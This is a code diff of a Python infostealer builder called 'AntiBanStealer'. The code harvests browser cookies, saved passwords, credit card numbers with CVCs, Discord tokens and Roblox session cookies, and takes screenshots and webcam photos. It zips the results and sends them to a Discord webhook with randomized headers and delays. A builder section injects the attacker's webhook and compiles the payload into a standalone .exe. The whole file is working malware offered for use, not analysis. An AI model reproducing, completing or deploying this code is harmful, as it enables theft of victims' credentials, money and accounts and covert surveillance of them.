@@ -47,21 +47,21 @@ class Colorate:
         lines = text.split('\n')
         total_chars = sum(len(line) for line in lines)
         colors = color_func(total_chars)
-
+        
         result = []
         color_index = 0
-
+        
         for line in lines:
             colored_line = ""
             for char in line:
                 if color_index < len(colors):
                     r, g, b = colors[color_index]
-                    colored_line += f"\033[38;2;{r};{g};{b}m{char}\033[0m"
+                    colored_line += f"\033[38;2;{r};{g};{b}m{char}"
                     color_index += step
                 else:
                     colored_line += char
             result.append(colored_line)
-
+        
         return '\n'.join(result) + "\033[0m"
 
 def clear_screen():
@@ -214,7 +214,7 @@ class AntiBanStealer:
                 'profiles': []
             }
         }
-
+        
         self.data = {
             'cookies': [],
             'passwords': [],
@@ -222,7 +222,7 @@ class AntiBanStealer:
             'tokens': [],
             'roblox': []
         }
-
+        
         self.stats = {
             'browsers_found': 0,
             'total_cookies': 0,
@@ -231,7 +231,7 @@ class AntiBanStealer:
             'total_tokens': 0,
             'total_roblox': 0
         }
-
+        
         self.pc_info = {}
         self.session_id = ''.join([str(hash(datetime.now().timestamp()))[i] for i in range(8)])
         self.temp_dir = os.path.join(os.environ.get('TEMP', ''), f'_s{self.session_id}')
@@ -268,7 +268,7 @@ class AntiBanStealer:
             cookies_path = os.path.join(profile_path, 'Cookies')
         if not os.path.exists(cookies_path):
             return
-
+        
         temp_db = os.path.join(self.temp_dir, f'c_{browser_name}_{self.session_id}.tmp')
         try:
             shutil.copy2(cookies_path, temp_db)
@@ -277,12 +277,12 @@ class AntiBanStealer:
             cursor.execute("SELECT host_key, name, value, encrypted_value FROM cookies")
             rows = cursor.fetchall()
             master_key = self.get_master_key(os.path.dirname(profile_path))
-
+            
             for host, name, value, encrypted_value in rows:
                 decrypted = value
                 if encrypted_value and master_key:
                     decrypted = self.decrypt_value(encrypted_value, master_key)
-
+                
                 self.data['cookies'].append({
                     'browser': browser_name,
                     'host': host,
@@ -290,7 +290,7 @@ class AntiBanStealer:
                     'value': decrypted
                 })
                 self.stats['total_cookies'] += 1
-
+            
             conn.close()
             os.remove(temp_db)
         except:
@@ -300,7 +300,7 @@ class AntiBanStealer:
         login_data = os.path.join(profile_path, 'Login Data')
         if not os.path.exists(login_data):
             return
-
+        
         temp_db = os.path.join(self.temp_dir, f'l_{browser_name}_{self.session_id}.tmp')
         try:
             shutil.copy2(login_data, temp_db)
@@ -309,12 +309,12 @@ class AntiBanStealer:
             cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
             rows = cursor.fetchall()
             master_key = self.get_master_key(os.path.dirname(profile_path))
-
+            
             for url, username, encrypted_password in rows:
                 password = ""
                 if encrypted_password and master_key:
                     password = self.decrypt_value(encrypted_password, master_key)
-
+                
                 if username or password:
                     self.data['passwords'].append({
                         'browser': browser_name,
@@ -323,7 +323,7 @@ class AntiBanStealer:
                         'password': password
                     })
                     self.stats['total_passwords'] += 1
-
+            
             conn.close()
             os.remove(temp_db)
         except:
@@ -333,31 +333,31 @@ class AntiBanStealer:
         web_data = os.path.join(profile_path, 'Web Data')
         if not os.path.exists(web_data):
             return
-
+        
         temp_db = os.path.join(self.temp_dir, f'w_{browser_name}_{self.session_id}.tmp')
         try:
             shutil.copy2(web_data, temp_db)
             conn = sqlite3.connect(temp_db)
             cursor = conn.cursor()
-
+            
             try:
                 cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, billing_address_id FROM credit_cards")
             except:
                 cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
-
+            
             rows = cursor.fetchall()
             master_key = self.get_master_key(os.path.dirname(profile_path))
-
+            
             for row in rows:
                 name = row[0]
                 month = row[1]
                 year = row[2]
                 encrypted_number = row[3]
-
+                
                 number = ""
                 if encrypted_number and master_key:
                     number = self.decrypt_value(encrypted_number, master_key)
-
+                
                 cvc = ""
                 try:
                     cursor.execute("SELECT value_encrypted FROM local_card_data WHERE guid = (SELECT guid FROM credit_cards WHERE name_on_card = ?)", (name,))
@@ -366,7 +366,7 @@ class AntiBanStealer:
                         cvc = self.decrypt_value(cvc_row[0], master_key)
                 except:
                     pass
-
+                
                 if name or number:
                     self.data['cards'].append({
                         'browser': browser_name,
@@ -377,7 +377,7 @@ class AntiBanStealer:
                         'cvc': cvc if cvc else 'N/A'
                     })
                     self.stats['total_cards'] += 1
-
+            
             conn.close()
             os.remove(temp_db)
         except:
@@ -387,18 +387,18 @@ class AntiBanStealer:
         localstorage_path = os.path.join(profile_path, 'Local Storage', 'leveldb')
         if not os.path.exists(localstorage_path):
             return
-
+        
         token_patterns = [
             r'[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}',
             r'mfa\\.[\\w-]{84}',
             r'[\\w-]{26}\\.[\\w-]{6}\\.[\\w-]{38}'
         ]
-
+        
         for file_path in glob.glob(os.path.join(localstorage_path, '*.ldb')):
             try:
                 with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                     content = f.read()
-
+                
                 for pattern in token_patterns:
                     tokens = re.findall(pattern, content)
                     for token in tokens:
@@ -415,22 +415,22 @@ class AntiBanStealer:
         for browser_name, browser_info in self.browsers.items():
             if browser_name == 'Firefox':
                 continue
-
+            
             browser_path = browser_info['path']
             if not os.path.exists(browser_path):
                 continue
-
+            
             for profile_name in browser_info['profiles']:
                 profile_path = os.path.join(browser_path, profile_name) if profile_name else browser_path
                 if not os.path.exists(profile_path):
                     continue
-
+                
                 cookies_path = os.path.join(profile_path, 'Network', 'Cookies')
                 if not os.path.exists(cookies_path):
                     cookies_path = os.path.join(profile_path, 'Cookies')
                 if not os.path.exists(cookies_path):
                     continue
-
+                
                 temp_db = os.path.join(self.temp_dir, f'r_{browser_name}_{self.session_id}.tmp')
                 try:
                     shutil.copy2(cookies_path, temp_db)
@@ -439,19 +439,19 @@ class AntiBanStealer:
                     cursor.execute("SELECT name, value, encrypted_value FROM cookies WHERE host_key LIKE '%.roblox.com%'")
                     rows = cursor.fetchall()
                     master_key = self.get_master_key(os.path.dirname(profile_path))
-
+                    
                     for name, value, encrypted_value in rows:
                         decrypted = value
                         if encrypted_value and master_key:
                             decrypted = self.decrypt_value(encrypted_value, master_key)
-
+                        
                         if name == '.ROBLOSECURITY' and decrypted:
                             self.data['roblox'].append({
                                 'browser': browser_name,
                                 'cookie': decrypted
                             })
                             self.stats['total_roblox'] += 1
-
+                    
                     conn.close()
                     os.remove(temp_db)
                 except:
@@ -469,7 +469,7 @@ class AntiBanStealer:
                 'ram': f"{round(psutil.virtual_memory().total / (1024**3), 2)} GB",
                 'hwid': self.get_hwid()
             }
-
+            
             try:
                 uptime_seconds = time.time() - psutil.boot_time()
                 uptime_hours = uptime_seconds / 3600
@@ -482,7 +482,7 @@ class AntiBanStealer:
     def get_hwid(self):
         try:
             if sys.platform == "win32":
-                hwid = subprocess.check_output('wmic csproduct get uuid', shell=True).decode().split('\n')[1].strip()
+                hwid = subprocess.check_output('wmic csproduct get uuid', shell=True).decode().split('\\n')[1].strip()
                 return hwid
             return "N/A"
         except:
@@ -520,9 +520,9 @@ class AntiBanStealer:
             browser_path = browser_info['path']
             if not os.path.exists(browser_path):
                 continue
-
+            
             self.stats['browsers_found'] += 1
-
+            
             if browser_name == 'Firefox':
                 try:
                     for profile_dir in os.listdir(browser_path):
@@ -536,7 +536,7 @@ class AntiBanStealer:
                     profile_path = os.path.join(browser_path, profile_name) if profile_name else browser_path
                     if not os.path.exists(profile_path):
                         continue
-
+                    
                     self.grab_chromium_cookies(browser_name, profile_path)
                     self.grab_chromium_passwords(browser_name, profile_path)
                     self.grab_chromium_cards(browser_name, profile_path)
@@ -562,23 +562,46 @@ Date         : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
 
 ================================
 """
-
-        passwords_content = "================================\n       PASSWORDS\n================================\n\n"
+        
+        passwords_content = "================================\\n"
+        passwords_content += "       PASSWORDS\\n"
+        passwords_content += "================================\\n\\n"
+        
         for pwd in self.data['passwords']:
-            passwords_content += f"Browser  : {pwd['browser']}\nURL      : {pwd['url']}\nUsername : {pwd['username']}\nPassword : {pwd['password']}\n" + "-" * 50 + "\n\n"
-
-        cards_content = "================================\n       CREDIT CARDS\n================================\n\n"
+            passwords_content += f"Browser  : {pwd['browser']}\\n"
+            passwords_content += f"URL      : {pwd['url']}\\n"
+            passwords_content += f"Username : {pwd['username']}\\n"
+            passwords_content += f"Password : {pwd['password']}\\n"
+            passwords_content += "-" * 50 + "\\n\\n"
+        
+        cards_content = "================================\\n"
+        cards_content += "       CREDIT CARDS\\n"
+        cards_content += "================================\\n\\n"
+        
         for card in self.data['cards']:
-            cards_content += f"Browser    : {card['browser']}\nName       : {card['name']}\nNumber     : {card['number']}\nExpiration : {card['exp_month']}/{card['exp_year']}\nCVC        : {card.get('cvc', 'N/A')}\n" + "-" * 50 + "\n\n"
-
-        discord_content = "================================\n       DISCORD TOKENS\n================================\n\n"
+            cards_content += f"Browser    : {card['browser']}\\n"
+            cards_content += f"Name       : {card['name']}\\n"
+            cards_content += f"Number     : {card['number']}\\n"
+            cards_content += f"Expiration : {card['exp_month']}/{card['exp_year']}\\n"
+            cards_content += f"CVC        : {card.get('cvc', 'N/A')}\\n"
+            cards_content += "-" * 50 + "\\n\\n"
+        
+        discord_content = "================================\\n"
+        discord_content += "       DISCORD TOKENS\\n"
+        discord_content += "================================\\n\\n"
+        
         for token in self.data['tokens']:
-            discord_content += f"Browser : {token['browser']}\nToken   : {token['token']}\n" + "-" * 50 + "\n\n"
-
-        cookies_content = "================================\n       COOKIES\n================================\n\n"
+            discord_content += f"Browser : {token['browser']}\\n"
+            discord_content += f"Token   : {token['token']}\\n"
+            discord_content += "-" * 50 + "\\n\\n"
+        
+        cookies_content = "================================\\n"
+        cookies_content += "       COOKIES\\n"
+        cookies_content += "================================\\n\\n"
+        
         for cookie in self.data['cookies'][:200]:
-            cookies_content += f"{cookie['browser']} | {cookie['host']} | {cookie['name']} | {cookie['value'][:50]}\n"
-
+            cookies_content += f"{cookie['browser']} | {cookie['host']} | {cookie['name']} | {cookie['value'][:50]}\\n"
+        
         browsers_content = f"""================================
        BROWSERS SUMMARY
 ================================
@@ -592,7 +615,7 @@ Roblox Cookies : {self.stats['total_roblox']}
 
 ================================
 """
-
+        
         return {
             'pc_info.txt': pc_info_content,
             'passwords.txt': passwords_content,
@@ -604,22 +627,22 @@ Roblox Cookies : {self.stats['total_roblox']}
 
     def create_zip_package(self):
         zip_path = os.path.join(self.temp_dir, f'{self.session_id}.zip')
-
+        
         try:
             txt_files = self.create_txt_files()
-
+            
             with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED, compresslevel=9) as zip_file:
                 for filename, content in txt_files.items():
                     zip_file.writestr(filename, content)
-
+                
                 screenshot_path = self.take_screenshot()
                 if screenshot_path and os.path.exists(screenshot_path):
                     zip_file.write(screenshot_path, 'screenshot.png')
-
+                
                 webcam_path = self.take_webcam_photo()
                 if webcam_path and os.path.exists(webcam_path):
                     zip_file.write(webcam_path, 'webcam.png')
-
+            
             return zip_path
         except:
             return None
@@ -627,23 +650,29 @@ Roblox Cookies : {self.stats['total_roblox']}
     def send_to_webhook(self, zip_path):
         try:
             webhook_url = "YOUR_WEBHOOK_URL_HERE"
-
+            
             delay = random.uniform(2.0, 5.0)
             time.sleep(delay)
-
+            
             with open(zip_path, 'rb') as f:
                 zip_data = f.read()
-
+            
             file_size_mb = len(zip_data) / (1024 * 1024)
             if file_size_mb > 24:
                 return False
-
+            
             files = {'file': (f'{self.session_id}.zip', zip_data, 'application/zip')}
-
-            embed_content = f"**Session {self.session_id}**\n\n**PC**\n{self.pc_info.get('pc_name', 'Unknown')}\n\n**User**\n{self.pc_info.get('username', 'Unknown')}\n\n**Browsers**\n{self.stats['browsers_found']}\n\n**Cookies**\n{self.stats['total_cookies']}\n\n**Passwords**\n{self.stats['total_passwords']}\n\n**Cards**\n{self.stats['total_cards']}\n\n"
-
+            
+            embed_content = f"**Session {self.session_id}**\\n\\n"
+            embed_content += f"**PC**\\n{self.pc_info.get('pc_name', 'Unknown')}\\n\\n"
+            embed_content += f"**User**\\n{self.pc_info.get('username', 'Unknown')}\\n\\n"
+            embed_content += f"**Browsers**\\n{self.stats['browsers_found']}\\n\\n"
+            embed_content += f"**Cookies**\\n{self.stats['total_cookies']}\\n\\n"
+            embed_content += f"**Passwords**\\n{self.stats['total_passwords']}\\n\\n"
+            embed_content += f"**Cards**\\n{self.stats['total_cards']}\\n\\n"
+            
             timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-
+            
             embed = {
                 "embeds": [{
                     "description": embed_content,
@@ -651,30 +680,31 @@ Roblox Cookies : {self.stats['total_roblox']}
                     "footer": {"text": f"ID: {self.session_id} | {timestamp}"}
                 }]
             }
-
+            
             data = {'payload_json': json.dumps(embed)}
-
+            
             user_agents = [
                 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101',
                 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
                 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
             ]
-
+            
             headers = {
                 'User-Agent': random.choice(user_agents),
                 'Accept': '*/*',
                 'Accept-Language': 'en-US,en;q=0.9',
                 'Accept-Encoding': 'gzip, deflate, br'
             }
-
+            
             max_retries = 3
             retry_count = 0
-
+            
             while retry_count < max_retries:
                 try:
                     response = requests.post(webhook_url, files=files, data=data, headers=headers, timeout=30)
-                    if response.status_code in (204, 200):
+                    
+                    if response.status_code == 204 or response.status_code == 200:
                         return True
                     elif response.status_code == 429:
                         retry_after = 5
@@ -683,16 +713,19 @@ Roblox Cookies : {self.stats['total_roblox']}
                             retry_after = int(retry_data.get('retry_after', 5))
                         except:
                             pass
-                        time.sleep(retry_after + random.uniform(1.0, 3.0))
+                        
+                        wait_time = retry_after + random.uniform(1.0, 3.0)
+                        time.sleep(wait_time)
                         retry_count += 1
                     else:
                         retry_count += 1
                         if retry_count < max_retries:
                             time.sleep(random.uniform(3.0, 6.0))
-                except:
+                except requests.exceptions.RequestException:
                     retry_count += 1
                     if retry_count < max_retries:
                         time.sleep(random.uniform(3.0, 6.0))
+            
             return False
         except:
             return False
@@ -708,11 +741,11 @@ Roblox Cookies : {self.stats['total_roblox']}
             self.get_pc_info()
             self.grab_all_browsers()
             self.grab_roblox_cookies()
-
+            
             zip_path = self.create_zip_package()
             if zip_path:
                 self.send_to_webhook(zip_path)
-
+            
             self.cleanup()
         except:
             pass
@@ -732,48 +765,48 @@ if __name__ == "__main__":
 
 def main():
     clear_screen()
-
+    
     ascii_art = """
-███████╗████████╗███████╗ █████╗ ██╗     ███████╗██████╗
+███████╗████████╗███████╗ █████╗ ██╗     ███████╗██████╗ 
 ██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║     ██╔════╝██╔══██╗
 ███████╗   ██║   █████╗  ███████║██║     █████╗  ██████╔╝
 ╚════██║   ██║   ██╔══╝  ██╔══██║██║     ██╔══╝  ██╔══██╗
 ███████║   ██║   ███████╗██║  ██║███████╗███████╗██║  ██║
 ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝
     """
-
+    
     Write(Colorate.Horizontal(Colors.green_to_cyan, Center.XCenter(ascii_art)))
-    print()
-
+    print("\n")
+    
     Write(Colorate.Horizontal(Colors.green_to_cyan, "Webhook : "))
     w = input().strip()
-
+    
     if not w.startswith('https://discord.com/api/webhooks/'):
         Write(Colorate.Horizontal(Colors.green_to_cyan, '\nWebhook invalide!\n'))
         sys.exit()
-
+    
     Write(Colorate.Horizontal(Colors.green_to_cyan, 'Choose file name : '))
     n = input().strip() or 'grabber'
-
+    
     c = PAYLOAD_CODE.replace('YOUR_WEBHOOK_URL_HERE', w)
-
+    
     os.makedirs('output', exist_ok=True)
     t = f'output/{n}_temp.py'
     e = f'output/{n}.exe'
-
+    
     print()
     Write(Colorate.Horizontal(Colors.green_to_cyan, 'Creation du payload...\n'))
-
+    
     with open(t, 'w', encoding='utf-8') as f:
         f.write(c)
-
+    
     Write(Colorate.Horizontal(Colors.green_to_cyan, 'Compilation en cours...\n'))
-
+    
     if subprocess.run(['pyinstaller', '--version'], capture_output=True).returncode != 0:
         Write(Colorate.Horizontal(Colors.green_to_cyan, '\nPyInstaller non installe!\n'))
         Write(Colorate.Horizontal(Colors.green_to_cyan, 'Installez avec: pip install pyinstaller\n'))
         sys.exit()
-
+    
     r = subprocess.run([
         'pyinstaller',
         '--onefile',
@@ -791,29 +824,24 @@ def main():
         '--clean',
         t
     ], capture_output=True, text=True)
-
+    
     if r.returncode != 0:
         Write(Colorate.Horizontal(Colors.green_to_cyan, '\nErreur de compilation!\n'))
         print(r.stderr[:500])
         sys.exit()
-
+    
     shutil.move(f'dist/{n}_temp.exe', e)
-
+    
     for p in [t, f'{n}_temp.spec', 'build', 'dist', '__pycache__']:
         try:
-            if os.path.isfile(p):
-                os.remove(p)
-            else:
-                shutil.rmtree(p, ignore_errors=True)
+            os.remove(p) if os.path.isfile(p) else shutil.rmtree(p, ignore_errors=True)
         except:
             pass
-
+    
     print()
-    success_banner = """══════════════════════════════════════════════════════════════════════
-                         COMPILATION REUSSIE!
-══════════════════════════════════════════════════════════════════════"""
+    success_banner = "══════════════════════════════════════════════════════════════════════\n                         COMPILATION REUSSIE!\n══════════════════════════════════════════════════════════════════════"
     Write(Colorate.Horizontal(Colors.green_to_cyan, Center.XCenter(success_banner)))
-    print()
+    print("\n")
     Write(Colorate.Horizontal(Colors.green_to_cyan, f"Fichier : output/{n}.exe\n"))
     Write(Colorate.Horizontal(Colors.green_to_cyan, f"Webhook : {w[:50]}...\n"))
     print()
